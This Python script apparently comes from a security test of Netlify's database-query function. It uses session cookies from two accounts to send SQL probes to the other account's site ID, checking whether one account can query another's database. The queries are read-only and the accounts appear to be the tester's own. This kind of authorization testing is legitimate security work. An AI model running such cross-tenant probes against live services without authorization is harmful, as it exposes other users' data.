# -*- coding: utf-8 -*-
"""Netlify:database-query 跨账号越权对测
测试矩阵:
  A1: A token + A site(基线-自有)
  B1: B token + B site(基线-自有)
  A->B: A token + B site(越权)
  B->A: B token + A site(越权)
"""
import http.client, ssl, gzip, brotli, sys, json
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, COOKIE_B, SITE_A

ctx = ssl.create_default_context()
SITE_B = 'd2977de0-d24d-4544-81cb-933e610cad7d'

def call_fn(cookie, site_id, action, sql=None):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=40)
    body = {'siteId': site_id, 'action': action}
    if sql is not None:
        body['sql'] = sql
    h = {'User-Agent': 'Mozilla/5.0', 'Accept-Encoding': 'br, gzip',
         'Cookie': cookie, 'Content-Type': 'application/json'}
    conn.request('POST', '/.netlify/functions/database-query', body=json.dumps(body).encode(), headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw

cases = [
    ('A->A self  check', COOKIE_A, SITE_A, 'check', None),
    ('B->B self  check', COOKIE_B, SITE_B, 'check', None),
    ('A->B cross check', COOKIE_A, SITE_B, 'check', None),
    ('B->A cross check', COOKIE_B, SITE_A, 'check', None),
]
print('=== check(只探测连接) ===')
for name, tok, sid, act, sql in cases:
    st, raw = call_fn(tok, sid, act)
    print('%-18s %d %s' % (name, st, raw[:120].decode('utf-8', 'ignore').replace('\n', ' ')))

print()
print('=== query select current_user(只读验证) ===')
q = "select current_user, current_database()"
cases2 = [
    ('A->A self  q', COOKIE_A, SITE_A),
    ('B->B self  q', COOKIE_B, SITE_B),
    ('A->B cross q', COOKIE_A, SITE_B),
    ('B->A cross q', COOKIE_B, SITE_A),
]
for name, tok, sid in cases2:
    st, raw = call_fn(tok, sid, 'query', q)
    print('%-18s %d %s' % (name, st, raw[:120].decode('utf-8', 'ignore').replace('\n', ' ')))

print()
print('=== query select count(只读表数探测) ===')
q2 = "select count(*) from pg_tables where schemaname='public'"
for name, tok, sid in cases2:
    st, raw = call_fn(tok, sid, 'query', q2)
    print('%-18s %d %s' % (name, st, raw[:120].decode('utf-8', 'ignore').replace('\n', ' ')))
